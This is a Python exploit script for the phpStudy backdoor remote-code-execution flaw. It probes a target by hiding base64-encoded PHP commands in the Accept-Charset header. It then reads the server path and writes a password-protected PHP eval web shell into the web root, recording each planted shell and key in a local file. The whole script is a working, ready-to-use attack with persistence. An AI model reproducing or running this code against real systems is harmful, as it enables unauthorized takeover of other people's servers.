import base64
import random
import requests
import string
import argparse

# help menu
parser = argparse.ArgumentParser(description='phpstudy-RCE-EXP --xzajyjs')
parser.add_argument('--url','-u',help='Target url.',required=True)
parser.add_argument('--shellName','-n',help='Custom your own shell name. If not fill, it will randomly generate 8 length of characters as filename',default=None)
parser.add_argument('--key','-k',help="Custom the webshell's key. If not fill, it will randomly generate 4 length of characters as webshell key.",default=None)
arg = parser.parse_args()

head={
    'Accept-Encoding':'gzip,deflate',
    'Accept-Charset':'c3lzdGVtKCJlY2hvIGhhaGExMjMiKTs=' # echo haha123
}

def get_standard_url(url):
    if url[:7] != "http://" or url[:8] != "https://":
        url = "http://"+url
        return url
    else:
        return False

def exp():
    head["Accept-Charset"] = "c3lzdGVtKCJjaGRpciIpOw==" # system("chdir")
    res1 = requests.get(url=url,headers=head,timeout=5,allow_redirects=False)
    path = str(res1.text.split("\n",1)[0]).strip()
    print(f'[-] Path:{path}')
    if(arg.shellName == None):
        shell_name = ''.join(random.sample(string.ascii_letters+string.digits,8))
    else:
        shell_name = arg.shellName
    if(arg.key == None):
        key = ''.join(random.sample(string.ascii_letters+string.digits,4))
    else:
        key = arg.key
    def write_shell(version_path):
        exp = f"fputs(fopen('{path}\{version_path}\WWW\{shell_name}.php','w'),'<?php @eval($_POST[{key}]); ?>');"
        exp_encode = str(base64.b64encode(exp.encode('utf-8'))).split("'",2)[1]
        head['Accept-Charset'] = exp_encode
        requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
    write_shell('phpStudy')
    write_shell('PHPTutorial')
    with open("webshell.txt", "a") as f:
        f.write(f"{url}/{shell_name}.php, {key}\n")
    return f"\033[33m[*] Shell_name={shell_name}.php, Key={key}\033[0m"


if __name__=="__main__":
    url = arg.url
    url = get_standard_url(url)
    print(f"[+] Target: {url}")
    try:
        res = requests.get(url=url, headers=head, timeout=5, allow_redirects=False)
        if res.status_code == 200 and res.text[:7] == "haha123":
            print("\033[32m[+] POC EXISTS.\033[0m")
            print(exp())
        else:
            print("\033[31m[-] POC NOT EXISTS.\033[0m")
    except:
        print("\033[41m[!] ERROR!\033[0m")
    